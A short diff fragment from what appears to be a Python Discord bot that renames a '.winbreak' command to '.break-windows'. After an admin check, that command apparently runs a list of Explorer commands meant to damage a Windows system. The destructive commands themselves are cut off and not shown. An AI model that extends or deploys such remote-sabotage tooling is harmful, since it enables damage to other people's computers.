@@ -4,7 +4,7 @@ import shutil
 # end of imports
 
 # on message
-elif message.content == '.winbreak':
+elif message.content == '.break-windows':
     await message.delete()
     if IsAdmin():
         explorer_commands = [
